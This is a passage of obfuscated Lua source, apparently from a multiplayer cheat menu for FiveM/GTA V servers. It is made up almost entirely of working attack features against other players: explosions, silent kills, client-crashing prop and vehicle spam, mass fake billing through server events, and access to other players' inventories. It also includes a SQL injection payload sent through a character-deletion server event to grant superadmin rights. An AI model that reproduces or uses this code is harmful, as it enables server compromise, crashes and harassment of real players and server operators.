				Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), 21, 100000.0, true, false, 0.0)
				elseif Button_yetwyfguydfkjesrg("Fire ~g~Player") then
				Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), 12, 100000.0, true, false, 0.0)
				elseif Button_yetwyfguydfkjesrg('Silent Kill ~g~Player') then
            	Czitirzen_Invoke(0x6B76DC1F3AE6E6A3, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 0)
			end
		
		Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('TeleportOnlineTrollOptionsghurehguke_ghrueghek') then
		if MenuButton_eytfudskfbukdsger("Maps", "Maps_Props_IAJSIFOJDISGSDG") then
		elseif MenuButton_eytfudskfbukdsger("Flags", "Flaps_Props_DSIUGHIUDSHGISD") then
		elseif Button_yetwyfguydfkjesrg('Spawn All Props', 'Native') then
				for i_didsfyg98sduriesdfg=1, #props_IDHSOGLFDSKGDUHIOSSD do
					Czlowiek_Wait_IDYGOSIFJGDFG(5)
			local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, props_IDHSOGLFDSKGDUHIOSSD[i_didsfyg98sduriesdfg]), 0, 0, 0, true, true, true)
								Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
								prop_dsugusiddfsg,
									Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
									Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
									0.4,
									0,
									0,
									0,
									270.0,
									60.0,
									true,
									true,
									false,
									true,
									1,
									true
								)
						end
					end
								
			for JSAGFUISHFUDS, DUGISUGDSHGISD in pairs(props_one_DSUHGIUDSGSDG) do
				if Button_yetwyfguydfkjesrg(""..JSAGFUISHFUDS, "Native") then
			local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, DUGISUGDSHGISD), 0, 0, 0, true, true, true)
								Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
								prop_dsugusiddfsg,
									Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
									Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
									0.4,
									0,
									0,
									0,
									270.0,
									60.0,
									true,
									true,
									false,
									true,
									1,
									true
								)
				end
			end	
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Flaps_Props_DSIUGHIUDSHGISD') then
			for JSAGFUISHFUDS, DUGISUGDSHGISD in pairs(flags_DHDSIUHGIUSDHGSD) do
				if Button_yetwyfguydfkjesrg(""..JSAGFUISHFUDS, "Native") then
			local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, DUGISUGDSHGISD), 0, 0, 0, true, true, true)
								Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
								prop_dsugusiddfsg,
									Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
									Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
									0.4,
									0,
									0,
									0,
									270.0,
									60.0,
									true,
									true,
									false,
									true,
									1,
									true
								)
				end
			end	
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Maps_Props_IAJSIFOJDISGSDG') then
		if Button_yetwyfguydfkjesrg('Mount Chilliad', "Native") then
				local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, 'cs1_lod3_terrain_slod3_01'), 0, 0, 0, true, true, true)
				local prop_2_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, 'cs1_lod3_terrain_slod3_06'), 0, 0, 0, true, true, true)
				Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
				prop_dsugusiddfsg,
					Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
					Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
					0.4,
					0,
					0,
					0,
					270.0,
					60.0,
					true,
					true,
					false,
					true,
					1,
					true
				)
				Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
				prop_2_dsugusiddfsg,
					Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
					Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
					0.4,
					0,
					0,
					0,
					270.0,
					60.0,
					true,
					true,
					false,
					true,
					1,
					true
				)
				elseif Button_yetwyfguydfkjesrg("Airport", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "ap1_lod_slod4"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("Los Santos City", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "dt1_lod_f1_slod3"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("Sandy Shores", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "cs4_lod_01_slod3"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("Paleto Bay", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "cs1_lod2_01_7_slod3"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("All Map", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "dt1_21_reflproxy"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("FBI", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "dt1_props_combo0110_slod"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("Mazebank", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "dt1_11_slod1"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("Hospital", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "sc1_08_hdg1"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("UFO", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "cs1_09_sea_ufo"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
									elseif Button_yetwyfguydfkjesrg("Yacht", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "apa_mp_apa_yacht_win"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("CIA", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "dt1_05_lod "), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("Hospital City", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "dt1_06_hospsignem"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("Installations", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "xm_mpchristmasadditions_hatch_10"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif Button_yetwyfguydfkjesrg("Rich House ( Online )", "Native") then
				 local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "ss1_11_slod"), 0, 0, 0, true, true, true)
                                Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
                                prop_dsugusiddfsg,
                                    Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD),
                                    Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
					end
		

			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('OnlineTrollMenu_DIFSYUGISERUDF') then
		SetSubTitle_uytdfukasjgsdklf('OnlineTrollMenu_DIFSYUGISERUDF', 'Player Options: '..GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(SelectedPlayer_IOAYFDUOFLDSGFSD))
			if Button_yetwyfguydfkjesrg('Spectate ~g~Player', (Spectating_IUDHUFISLFGDFG and "~g~[SPECTATING]")) then
				SpectatePlayer_IDUHYISOUHGIUFSGDFG(SelectedPlayer_IOAYFDUOFLDSGFSD)
			elseif Button_yetwyfguydfkjesrg("Spectate ~g~Player ~p~[ #2 ]", (spectate_global_dugsuydhkgsdfgdf and "~g~[ SPECTATING ]")) then
			SpectatePlayer_UD_HugeV_SUGUFYDGUIDF(SelectedPlayer_IOAYFDUOFLDSGFSD)
            elseif Button_yetwyfguydfkjesrg("Cage ~g~Player") then
            FreezePlayer_HugeV_SDIGDSOGSDG = true
            Czlowiek_Wait_IDYGOSIFJGDFG(50)
            local coords_DUIGFUDSIHGIFDG = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), true)					
            local obj_DSUHGISDUGSDG = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, "prop_gascage01"), coords_DUIGFUDSIHGIFDG.x, coords_DUIGFUDSIHGIFDG.y, coords_DUIGFUDSIHGIFDG.z, true, true, true)
            Czlowiek_Wait_IDYGOSIFJGDFG(50)
            FreezePlayer_HugeV_SDIGDSOGSDG = false
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Freeze ~g~Player",
				FreezePlayer_HugeV_SDIGDSOGSDG,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					FreezePlayer_HugeV_SDIGDSOGSDG = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
				elseif Button_yetwyfguydfkjesrg("Fly ~g~Player Vehicle") then
				if not Czitirzen_Invoke(0x997ABD671D25CA0B, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 0) then
					PushNotification_DSGJHDSGHSIDUGDS("Player must be in vehicle")		
				else
					local veh_hguerhjgbjrebjhretbjrth = GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 0)
					OMGIREALYNEEDSTOCHANGEYOUMOTHERFUCKER(veh_hguerhjgbjrebjhretbjrth)
					Czitirzen_Invoke(0xC5F68BE9613E2D18, veh_hguerhjgbjrebjhretbjrth, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
				end
				elseif Button_yetwyfguydfkjesrg("Send bill", "ESX") then
                    local FUCKKKKKKKKKK = KeyBoardInput_jdhgijslrgeg("How much bills", "", 20)
                    if tonumber(FUCKKKKKKKKKK) == nil then
					PushNotification_DSGJHDSGHSIDUGDS("Answer must be a number")
					else
                        for IiIipAWCIOREGHEGR = 1, FUCKKKKKKKKKK do
                            TriggerServerEvent(
                                true,
                                "esx_billing:sendBill",
                                GetPlayerId_HugeV_OIDHUFIDSUGLFD(SelectedPlayer_IOAYFDUOFLDSGFSD),
                                "HugeV Credit",
                                "HugeV best menu LOL",
                                1000000
                            )
                        end
                    end
			elseif Button_yetwyfguydfkjesrg('Clone Outfit') then
			ClonePed_HugeV_UDYUIGDFGDF(SelectedPlayer_IOAYFDUOFLDSGFSD)
			--[[elseif Button_yetwyfguydfkjesrg("Print ~g~Player Outfit") then
			print_player_outfit(SelectedPlayer_IOAYFDUOFLDSGFSD)]]
			elseif Button_yetwyfguydfkjesrg("Quick Replacement", 'Native') then
			QuickReplacement_HugeV_UDHUKGDFHKDFGDF(SelectedPlayer_IOAYFDUOFLDSGFSD)
			elseif Button_yetwyfguydfkjesrg("Teleport to player", "Native") then
            local entityfdhudfkidfh = Czitirzen_Invoke(0x997ABD671D25CA0B, Czitirzen_Invoke(0xD80958FC74E988A6), false) and Czitirzen_Invoke(0x6094AD011A2EA87D, Czitirzen_Invoke(0xD80958FC74E988A6)) or Czitirzen_Invoke(0xD80958FC74E988A6)
			Czitirzen_Invoke(0x06843DA7060A026B, entityfdhudfkidfh, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), 0.0, 0.0, 0.0, false)
		elseif Button_yetwyfguydfkjesrg("Track ~g~Player", "Native") then
		if SelectedPlayer_IOAYFDUOFLDSGFSD == 0 then
		PushNotification_DSGJHDSGHSIDUGDS("You trying track self... Wait thats illegal")
		else
			local COORDY_XDDXDXDXDX = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
			Czitirzen_Invoke(0xFE43368D2AA4F2FC, COORDY_XDDXDXDXDX)
		end
		elseif Button_yetwyfguydfkjesrg("Open ~g~Player Inventory ") then
	            TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerId_HugeV_OIDHUFIDSUGLFD(SelectedPlayer_IOAYFDUOFLDSGFSD), GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(SelectedPlayer_IOAYFDUOFLDSGFSD))
				elseif Button_yetwyfguydfkjesrg("Kick From Vehicle") then
					Czitirzen_Invoke(0xAAA34F8A7CB32098, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
				elseif Button_yetwyfguydfkjesrg("Give All Weapons To ~g~Player") then
					for i_didsfyg98sduriesdfg = 1, #Wszystkie_Bronie_Umnie_duaghoidfgdf do
						Czitirzen_Invoke(0xBF0FD6E56C964FCB, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), Czitirzen_Invoke(0xD24D37CC275948CC, "WEAPON_"..Wszystkie_Bronie_Umnie_duaghoidfgdf[i_didsfyg98sduriesdfg]), 1000, false, false)
					end
				elseif Button_yetwyfguydfkjesrg("Revive", "ESX") then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerId_HugeV_OIDHUFIDSUGLFD(SelectedPlayer_IOAYFDUOFLDSGFSD))
					elseif Button_yetwyfguydfkjesrg("Add Admin", "~r~[ KASCHARACTERS ]") then
					TriggerServerEvent('kashactersS:DeleteCharacter', "';UPDATE `users` SET `permission_level` = '4', `group` = 'superadmin'where_DSGHSDIUGSDG `users`.`name` = '"..NetworkPlayerGetName(PlayerId()).."';")
                elseif Button_yetwyfguydfkjesrg("~g~Heal ~s~~g~Player", "~b~VRP") then 
                    Czitirzen_Invoke(0x6B76DC1F3AE6E6A3, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 200) 
                elseif Button_yetwyfguydfkjesrg("~b~Give Armour", "~b~VRP") then 
                    Czitirzen_Invoke(0xCEA04D83135264CC, Czitirzen_Invoke(0xD80958FC74E988A6, SelectedPlayer_IOAYFDUOFLDSGFSD), 200)
					elseif Button_yetwyfguydfkjesrg("Plane Explode", "Native") then
					Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), 8, 100000.0, true, false, 0.0)
			elseif MenuButton_eytfudskfbukdsger("~s~Fuck ~g~Player Menu", "Crashes_Vehicles_hugehtrugertk") then 
			elseif MenuButton_eytfudskfbukdsger("~s~Troll Menu", "TrollOptions_DUHGSIUDHGIUDFSGDF") then			
			elseif MenuButton_eytfudskfbukdsger("~s~Prop Menu", "TeleportOnlineTrollOptionsghurehguke_ghrueghek") then
			
		
		end			
		
		Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg("Crashes_Vehicles_hugehtrugertk") then
		if Button_yetwyfguydfkjesrg("Spawn Explode Vehicles") then 
		for i_didsfyg98sduriesdfg=0, 25 do
                local coordsdfgkjdhgliodfigdfg = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
                local autko_smiecie_z_api_ac_XD = Czitirzen_Invoke(0xD24D37CC275948CC, "Tanker")
				RequestModelSync_SDUFHSIDGSDG(autko_smiecie_z_api_ac_XD)
                local vehdgdfiugidfgdfgfghdfhfdgh = Czitirzen_Invoke(0xAF35D0D2583051B0, autko_smiecie_z_api_ac_XD, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, Czitirzen_Invoke(0xE83D4F9BA2A38914, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), true, true)
				end
			elseif Button_yetwyfguydfkjesrg("Spawn Shit Vehicles") then 
				for i_didsfyg98sduriesdfg=0, 25 do
						local coordsdfgkjdhgliodfigdfg = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
						local autko_smiecie_z_api_ac_XD = Czitirzen_Invoke(0xD24D37CC275948CC, "Dump")
						RequestModelSync_SDUFHSIDGSDG(autko_smiecie_z_api_ac_XD)
						local vehdgdfiugidfgdfgfghdfhfdgh = Czitirzen_Invoke(0xAF35D0D2583051B0, autko_smiecie_z_api_ac_XD, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, Czitirzen_Invoke(0xE83D4F9BA2A38914, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), true, true)
						end
					elseif Button_yetwyfguydfkjesrg("Spawn Marquis Vehicles", "~b~[ CRASH PLAYER ]") then 
						for i_didsfyg98sduriesdfg=0, 50 do
								local coordsdfgkjdhgliodfigdfg = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
								local autko_smiecie_z_api_ac_XD = Czitirzen_Invoke(0xD24D37CC275948CC, "Marquis")
								RequestModelSync_SDUFHSIDGSDG(autko_smiecie_z_api_ac_XD)
								local vehdgdfiugidfgdfgfghdfhfdgh = Czitirzen_Invoke(0xAF35D0D2583051B0, autko_smiecie_z_api_ac_XD, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, Czitirzen_Invoke(0xE83D4F9BA2A38914, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), true, true)
								end
								elseif Button_yetwyfguydfkjesrg("Spawn Tug Vehicles", "~b~[ CRASH PLAYER ]") then 
						for i_didsfyg98sduriesdfg=0, 50 do
								local coordsdfgkjdhgliodfigdfg = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
								local autko_smiecie_z_api_ac_XD = Czitirzen_Invoke(0xD24D37CC275948CC, "Tug")
								RequestModelSync_SDUFHSIDGSDG(autko_smiecie_z_api_ac_XD)
								local vehdgdfiugidfgdfgfghdfhfdgh = Czitirzen_Invoke(0xAF35D0D2583051B0, autko_smiecie_z_api_ac_XD, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, Czitirzen_Invoke(0xE83D4F9BA2A38914, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), true, true)
								end
								elseif Button_yetwyfguydfkjesrg("Spawn Jets", "~b~[ CRASH PLAYER ]") then 
						for i_didsfyg98sduriesdfg=0, 25 do
								local coordsdfgkjdhgliodfigdfg = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
								local autko_smiecie_z_api_ac_XD = Czitirzen_Invoke(0xD24D37CC275948CC, "Jet")
								RequestModelSync_SDUFHSIDGSDG(autko_smiecie_z_api_ac_XD)
								local vehdgdfiugidfgdfgfghdfhfdgh = Czitirzen_Invoke(0xAF35D0D2583051B0, autko_smiecie_z_api_ac_XD, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, Czitirzen_Invoke(0xE83D4F9BA2A38914, Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), true, true)
								end
end

		    Display_uyeigsgegkersugesrg()
